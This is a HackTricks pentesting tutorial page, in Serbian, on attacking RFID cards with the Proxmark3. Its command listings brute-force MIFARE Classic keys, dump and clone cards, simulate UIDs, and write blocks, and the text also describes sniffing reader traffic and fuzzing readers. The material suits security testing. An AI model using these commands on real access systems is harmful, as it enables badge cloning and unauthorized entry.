# Proxmark 3

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS-a ili preuzimanje HackTricks-a u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova** [**hacktricks repozitorijumu**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijumu**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Try Hard Security Group**

<figure><img src="../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Napadi na RFID sisteme sa Proxmark3

Prvo što trebate uraditi je imati [**Proxmark3**](https://proxmark.com) i [**instalirati softver i njegove zavisnosti**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Napadi na MIFARE Classic 1KB

Ima **16 sektora**, svaki od njih ima **4 bloka** i svaki blok sadrži **16B**. UID se nalazi u sektoru 0 bloku 0 (i ne može se menjati).\
Da biste pristupili svakom sektoru, potrebne su vam **2 ključa** (**A** i **B**) koji se čuvaju u **bloku 3 svakog sektora** (sektorski blok). Sektor blok takođe čuva **pristupne bitove** koji daju dozvole za **čitanje i pisanje** na **svakom bloku** koristeći 2 ključa.\
2 ključa su korisna za davanje dozvola za čitanje ako znate prvi ključ i pisanje ako znate drugi ključ (na primer).

Mogu se izvesti nekoliko napada

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3 omogućava obavljanje drugih radnji poput **prisluškivanja** komunikacije **Oznaka ka čitaču** kako bi se pokušalo pronaći osetljive podatke. Na ovom uređaju možete samo špijunirati komunikaciju i izračunati korišćeni ključ jer su **kriptografske operacije koje se koriste slabe** i znajući običan i šifrovan tekst možete ga izračunati (`mfkey64` alat).

### Sirove Komande

Sistemi IoT-a ponekad koriste **nebrendirane ili nekomercijalne oznake**. U tom slučaju, možete koristiti Proxmark3 da biste poslali prilagođene **sirove komande oznakama**.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```

Sa ovim informacijama možete pokušati da pronađete informacije o kartici i načinu komunikacije s njom. Proxmark3 omogućava slanje sirovih komandi poput: `hf 14a raw -p -b 7 26`

### Skripte

Proxmark3 softver dolazi sa prednapunjenim listom **automatizovanih skripti** koje možete koristiti za obavljanje jednostavnih zadataka. Da biste dobili punu listu, koristite komandu `script list`. Zatim koristite komandu `script run`, praćenu imenom skripte:

```
proxmark3> script run mfkeys
```

Možete kreirati skriptu za **fuzziranje čitača oznaka**, tako što ćete kopirati podatke sa **validne kartice** i napisati **Lua skriptu** koja **randomizuje** jedan ili više **slučajnih bajtova** i proverava da li se **čitač ruši** sa bilo kojom iteracijom.

**Try Hard Security Group**

<figure><img src="../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od početnika do stručnjaka sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristupiti **najnovijoj verziji PEASS-a ili preuzeti HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) **Discord grupi** ili **telegram grupi** ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repozitorijum**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijum**](https://github.com/carlospolop/hacktricks-cloud).

</details>
